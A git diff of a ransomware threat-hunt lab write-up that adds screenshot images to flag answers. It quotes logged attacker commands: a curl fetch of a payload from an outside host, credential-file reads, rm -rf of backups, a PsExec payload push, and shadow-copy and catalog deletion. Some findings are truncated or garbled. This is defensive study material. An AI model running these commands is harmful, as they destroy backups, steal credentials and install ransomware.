@@ -1,6 +1,6 @@
 # 🚩 Threat Hunt SAGA#4: Dead In The Water
 
-<!-- cover image: upload to the PR and paste the <img> line here -->
+<img width="740" height="1110" alt="DEAD IN THE WATER" src="https://github.com/user-attachments/assets/5c6140a9-c177-4b4b-8b68-62eacd3ae6ef" />
 
 **Sandbox Contributor:** [Cyber Range AZURE LAW by Josh Madakor's team](https://www.skool.com/cyber-community)  
 **Hunt Design Master:** <!-- Hunt Design Master name -->  
@@ -178,7 +178,7 @@ DeviceProcessEvents
 
 **Output:** `"ssh.exe" backup-admin@10.1.0.189`  
 **Finding:** Ransomware only pays off if the victim can't restore from backups. So before encrypting anything, the attacker jumps from the workstation they control to the backup server to wipe or damage the backups. This command is that jump.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1190" height="68" alt="Pasted Graphic" src="https://github.com/user-attachments/assets/f3b213df-3ea2-4f57-af04-b3f7316835a1" />
 
 ---
 
@@ -203,7 +203,7 @@ DeviceNetworkEvents
 
 **Output:** `10.1.0.108`  
 **Finding:** ‘azuki-adminpc’’ is the sourcethat the host later pushes silentlynx.exe with PsExec64 to 10.1.0.102, 10.1.0.188
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1241" height="295" alt="Pasted Graphic 3" src="https://github.com/user-attachments/assets/71e7aa10-24b7-4514-a320-f54b2793ddff" />
 
 ---
 
@@ -228,7 +228,7 @@ DeviceLogonEvents
 
 **Output:** `backup-admin`  
 **Finding:** The attacker didn't create this account. It also runs the server's scheduled overnight jobs, so it's a trusted account in everyday use. That means the attacker had working credentials for it, and their logins blend in with normal activity. This matters because attackers often go after backups, either to stop the victim from recovering or to steal the data stored there.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1267" height="325" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/fb8c6507-460b-44a9-934a-d158f4045e45" />
 
 ---
 
@@ -253,7 +253,7 @@ DeviceProcessEvents
 
 **Output:** `ls --color=auto -la /backups/`  
 **Finding:** The attacker's first look at the company's backups was a single listing of the whole main backup folder, typed by a person. It's the earliest hand-typed listing in your results. It comes just before the attacker opened each subfolder one at a time and read a password file, and many hours before they deleted everything the next morning. You can tell a person typed it because it has the color switch, which Ubuntu adds automatically when someone types the command at a terminal. The listings without that switch came from the automatic software updater. The single-subfolder listings don't fit the question, and neither do the listings of Linux's own settings-backup folder. One thing isn't proven yet. Your query didn't show which account ran each command or what started it, so the command isn't tied to the stolen account's remote login yet. The two queries from my last message will close that gap. The same command text shows up again after the deletions, so the answer is the same whichever session it belongs to.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1212" height="335" alt="Pasted Graphic 5" src="https://github.com/user-attachments/assets/b2f3b6fc-d23b-4c7b-8fca-5ea87015182a" />
 
 ---
 
@@ -278,7 +278,7 @@ DeviceProcessEvents
 
 **Output:** `find /backups -name *.tar.gz`  
 **Finding:** It's the first search in the results, run at 2:16 PM on November 24 on the backup server. It looks inside the same backups folder the attacker had just listed in Flag 4, and it hunts for files ending in .tar.gz, which is the standard format for Linux backup archives. This is the point where the attacker moved from seeing what was in the folder to finding the actual backup files. That makes it the reconnaissance step the question is asking about.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1269" height="142" alt="Pasted Graphic 6" src="https://github.com/user-attachments/assets/4921e046-6757-4a6f-9369-4e4c4987001f" />
 
 ---
 
@@ -303,7 +303,7 @@ DeviceProcessEvents
 
 **Output:** `cat /etc/passwd`  
 **Finding:** The right command has to pass four tests. First, it has to list the accounts on the machine. The command you named passes this one: it prints the file where Linux keeps every user account, which is the most common way attackers do this. Second, it has to be run by the same account as Flags 4 and 5. Third, it has to be launched from the same command-line session. Fourth, it has to come shortly after the Flag 5 search.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1266" height="264" alt="Pasted Graphic 7" src="https://github.com/user-attachments/assets/e3d0d8c6-92f6-43c1-8d05-921b1c9c3bc9" />
 
 ---
 
@@ -328,7 +328,7 @@ DeviceProcessEvents
 
 **Output:** `cat /etc/crontab`  
 **Finding:** After the enumeration, the attacker ran `cat /etc/crontab` on the backup server (azuki-backupsrv). That file is the system-wide schedule of automated jobs, so reading it shows when things like backups run. It came three milliseconds after `crontab -l`, which only lists the current user's scheduled jobs. That timing suggests both were typed together in one hands-on session, right after the attacker had found the backup archives and read the user list. Every other matching row is the server's own scheduler starting up on its normal timer. Knowing the backup schedule tells the attacker when deleting or encrypting the backups would do the most damage.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="919" height="272" alt="11242335 217 00 538 PM" src="https://github.com/user-attachments/assets/e2af33f9-227e-496b-946c-f645e2129e44" />
 
 ---
 
@@ -355,7 +355,7 @@ DeviceProcessEvents
 
 **Output:** `curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`  
 **Finding:** It uses curl -L, which follows redirects, and -o destroy.7z, which saves the file under that name, to fetch
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1285" height="179" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/37831fc7-bcda-4db2-896b-e7b2bed58066" />
 
 ---
 
@@ -380,7 +380,7 @@ DeviceProcessEvents
 
 **Output:** `cat /backups/configs/all-credentials.txt`  
 **Finding:** This one’s pretty self explanatory. The attacker did a sloppy job, naming the file after the word ‘credential’. And we can see the file name with extension .txt is named after the literal word where the attacker stores the keys to access the backups.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1139" height="77" alt="Pasted Graphic 10" src="https://github.com/user-attachments/assets/a91cb8d5-e196-4f06-89c8-7bfdde3519da" />
 
 ---
 
@@ -404,7 +404,9 @@ DeviceProcessEvents
 
 **Output:** `rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations`  
 **Finding:** The Commandline represents the ‘root’ forced recursive delete of all “14” backup directories from an interactive bash session; first directory path is /backups/archives. It proves to be the removal of all backup copies in the database. The long version is correct because the asterisk version never shows up in the logs. The monitoring tool records a command after Linux has already swapped the asterisk for the real folder names. That makes the long line the only version that exists in the evidence. The asterisk version is my guess at what the attacker typed, and a grader can only check against what was logged.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1277" height="169" alt="Pasted Graphic 11" src="https://github.com/user-attachments/assets/6e8dcee0-1954-4ab8-b27b-6bc1c97ef704" />
+<img width="1244" height="70" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/9e5e934e-1598-4326-bf18-74f8ebb7f714" />
+
 
 ---
 
@@ -428,7 +430,7 @@ DeviceProcessEvents
 
 **Output:** `systemctl stop cron`  
 **Finding:** The question asks which command *stopped* the service, and only one of those two commands does that. A stop command switches the service off right away. A disable command leaves the running service alone. It only removes the service from the list of things that start automatically when the server reboots. It's the difference between switching a machine off and unplugging its timer so it won't turn itself back on tomorrow. A disable command also stops the service only when it includes an extra "now" option, and the disable commands in these rows don't have it. The attacker ran the two back to back, and each had a different job. They wiped the backup folders. About a second later they switched off the scheduler, so no new backup job could run and replace what they'd deleted. A few hundredths of a second after that, they disabled it so a reboot wouldn't bring it back. The stop is what actually halted the service. The disable made the outage permanent.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="830" height="231" alt="I FileName" src="https://github.com/user-attachments/assets/e0de9116-0826-4387-be6e-a1a7425790c2" />
 
 ---
 
@@ -452,7 +454,7 @@ DeviceProcessEvents
 
 **Output:** `systemctl disable cron`  
 **Finding:** In Flag 11 the attacker stopped the backup service, which only lasts until the machine restarts. This flag asks for the next step: the command that turned the service off permanently, so it stays off even after a reboot. The answer is the whole command exactly as it was logged with the a keyword ‘disable’ to prevent the command of backup from reviving after the system restart.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="727" height="189" alt="TimeGenerated (UTC T" src="https://github.com/user-attachments/assets/8ed9ca67-81b5-4810-ae57-607b1400069e" />
 
 ---
 
@@ -476,7 +478,7 @@ DeviceNetworkEvents
 
 **Output:** `PsExec64.exe`  
 **Finding:** **PsExec64.exe** (row 35) is the odd one out, and the way you spot it is the shape of the command. The `\\10.1.0.102` is Windows's way of naming a *different* machine on the network. The `-u kenji.sato -p **********` supplies a username and password to log into that machine. And `-c -f ...silentlynx.exe` copies a program over and forces it to run there. That combination — remote address, borrowed credentials, push-and-execute — is exactly "run a command on someone else's computer."
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1090" height="274" alt="Pasted Graphic 2" src="https://github.com/user-attachments/assets/b033c949-e337-4d41-aac1-bf9b8e5e69c2" />
 
 ---
 
@@ -500,7 +502,7 @@ DeviceProcessEvents
 
 **Output:** `"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`  
 **Finding:** The DeviceProcessEvents log shows the complete command in plain text, with the target, the account, and the payload. The only uncertainty is which of the three nearly identical runs the flag wants.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1083" height="158" alt="Pasted Graphic 3" src="https://github.com/user-attachments/assets/47e81686-727b-4e08-a9dd-3c3133df7b9c" />
 
 ---
 
@@ -525,7 +527,7 @@ DeviceNetworkEvents
 
 **Output:** `silentlynx.exe`  
 **Finding:** “silentlynx.exe” is the payload because PsExec64.exe is only the tool doing the delivery, and silentlynx.exe is the file named after the "copy this file over" switch, so PsExec copied it from the admin PC to the second machine at 10.1.0.102 and ran it there.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1266" height="71" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/fc16269f-e558-44f1-b81e-7d5d65feb381" />
 
 ---
 
@@ -550,7 +552,7 @@ DeviceProcessEvents
 
 **Output:** `"net" stop VSS /y`  
 **Finding:** Two of the six rows show the shadow copy service being stopped: rows 1 and 4. In both, the ransomware starts the built-in Windows "net" tool and tells it to stop the service named VSS, and the command text is exactly the same in both rows. The rows differ only in computer, account and time. Row 1 ran on azuki-adminpc under yuki.tanaka at 06:04:53. Row 4 ran on azuki-sl under kenji.sato at 06:07:03, about two minutes later. The other four rows are decoys. Rows 2, 3, 5 and 6 are vssadmin commands. They delete the existing backup snapshots or shrink the disk space set aside for them, and neither of those stops the service. On each machine they run a few seconds after the stop command. That's the usual order: stop the service first, then wipe the snapshots.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1258" height="212" alt="Pasted Graphic 5" src="https://github.com/user-attachments/assets/99bb8b79-96d3-4d4d-9325-62f2048124eb" />
 
 ---
 
@@ -575,7 +577,7 @@ DeviceProcessEvents
 
 **Output:** `"net" stop wbengine /y`  
 **Finding:** “wbengine” is the Windows short name for the "Block Level Backup Engine Service," the only service the ransomware stopped with "backup engine" in its official name, while SDRSVC is the general Windows Backup service and the other four are shadow copies, Defender and Security Center.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1261" height="287" alt="Pasted Graphic 7" src="https://github.com/user-attachments/assets/b6e345ec-9eda-4287-b2d9-b2fadd9c88c1" />
 
 ---
 
@@ -601,7 +603,7 @@ DeviceProcessEvents
 
 **Output:** `"taskkill" /F /IM sqlservr.exe`  
 **Finding:** `"taskkill" /F /IM sqlservr.exe` is the first kill command on both machines. The ransomware closed eight programs one after another, and when a question asks for one command out of a burst like that, the answer key almost always uses the first. SQL Server is also the program that best fits "locking files": it's Microsoft's database program, and it keeps its database files open the whole time it runs.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1260" height="294" alt="Pasted Graphic 8" src="https://github.com/user-attachments/assets/233f699a-0e89-4fbd-b713-47ea2d811b66" />
 
 ---
 
@@ -627,7 +629,7 @@ DeviceProcessEvents
 
 **Output:** `"vssadmin" delete shadows /all /quiet`  
 **Finding:** This flag is about deleting “shadow” copies (the saved snapshots Windows uses to roll files back), not the backup catalog. That alone doesn't settle it, though, because your results have two different commands that delete shadow copies.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1254" height="187" alt="Pasted Graphic 9" src="https://github.com/user-attachments/assets/1645e42f-8cfd-4a35-b720-6d9029b1e2a7" />
 
 ---
 
@@ -651,7 +653,7 @@ DeviceProcessEvents
 
 **Output:** `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB`  
 **Finding:** After deleting the existing backup snapshots, the attacker used the same built-in Windows backup tool to shrink the space allowed for new snapshots to a tiny amount, which stops Windows from keeping restore points, and both versions count because the tool's name starts the same program whether or not it ends in ".exe".
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1259" height="128" alt="Pasted Graphic 10" src="https://github.com/user-attachments/assets/2da7d5e0-933f-429f-b644-f9c3a4c20cb1" />
 
 ---
 
@@ -675,7 +677,7 @@ DeviceProcessEvents
 
 **Output:** `"bcdedit" /set {default} recoveryenabled No`  
 **Finding:** The command represents a small settings store Windows reads at startup to decide how to boot, which entry to load, and whether to offer the automatic repair screen when a boot fails. Turning that setting off means the machine no longer drops into repair mode after a failed boot, so the victim can't roll back that way. It has nothing to do with backups.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1273" height="290" alt="Pasted Graphic 11" src="https://github.com/user-attachments/assets/a05d47f3-1093-4484-9be8-d4728f024e84" />
 
 ---
 
@@ -700,7 +702,7 @@ DeviceProcessEvents
 
 **Output:** `"wbadmin" delete catalog -quiet`  
 **Finding:** The command destroys the Windows Backup catalogue. That's not a backup itself — it's the index that records which backups exist and where they're stored. Kill the index and the machine no longer believes it has any backups to restore from, even if the backup files are physically still on disk. Recovering after this needs a manual catalogue rebuild from the backup target.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1179" height="293" alt="Pasted Graphic 12" src="https://github.com/user-attachments/assets/387e3cf2-3f81-473f-9320-5c0e75ae2d52" />
 
 ---
 
@@ -726,7 +728,7 @@ DeviceRegistryEvents
 
 **Output:** `WindowsSecurityHealth`  
 **Finding:** The attacker established persistence by adding a made-up entry named WindowsSecurityHealth to the per-user Run key on both compromised machines as part of obfuscation, pointing it at a malicious executable hidden in a Windows temp folder, so the payload would relaunch automatically at every logon.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1271" height="153" alt="Pasted Graphic 14" src="https://github.com/user-attachments/assets/53e935fd-6995-44a2-99c4-bea6fa37d6bc" />
 
 ---
 
@@ -751,7 +753,7 @@ DeviceProcessEvents
 
 **Output:** `Microsoft\Windows\Security\SecurityHealthService`  
 **Finding:** Task Scheduler works like a filing cabinet. Windows doesn't keep all scheduled tasks in one flat list — it sorts them into folders, exactly the way File Explorer sorts documents. Open Task Scheduler on any Windows machine and you'll see a tree down the left side: a Microsoft folder, a Windows folder inside that, then dozens of subfolders for different components. The reason the attacker chose that spot is camouflage. There are real Microsoft-signed tasks living in that same folder tree, so a fake one buried alongside them doesn't stand out to anyone scrolling the list.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1280" height="104" alt="Pasted Graphic 15" src="https://github.com/user-attachments/assets/14bdf852-4db6-49fe-932f-c8926292e766" />
 
 ---
 
@@ -776,7 +778,7 @@ DeviceProcessEvents
 
 **Output:** `"fsutil.exe" usn deletejournal /D C:`  
 **Finding:** It is the newest event in the entire result set, and it lands roughly three minutes after the last recovery-destruction command finished. It is the last Anti-forensics attempts to remove all evidence of artifacts and tools used for malicious data encryption.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1270" height="288" alt="Pasted Graphic 16" src="https://github.com/user-attachments/assets/9de3dab4-06e7-4beb-acbb-d45deac70fd2" />
 
 ---
 
@@ -801,7 +803,7 @@ DeviceProcessEvents
 
 **Output:** `SILENTLYNX_README.txt`  
 **Finding:** The purpose of this attack is intentional, and the attacker wants to be known. In order for ransom to make sense. The attacker wants the file appeared on the victim workstation's desktop during the destruction phase, minutes after the change journal was wiped, and was opened directly by a user rather than by any attacker process.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1266" height="235" alt="Pasted Graphic 17" src="https://github.com/user-attachments/assets/12cb8f45-d508-4abc-9f50-ab487d5f215d" />
 
 ---
 
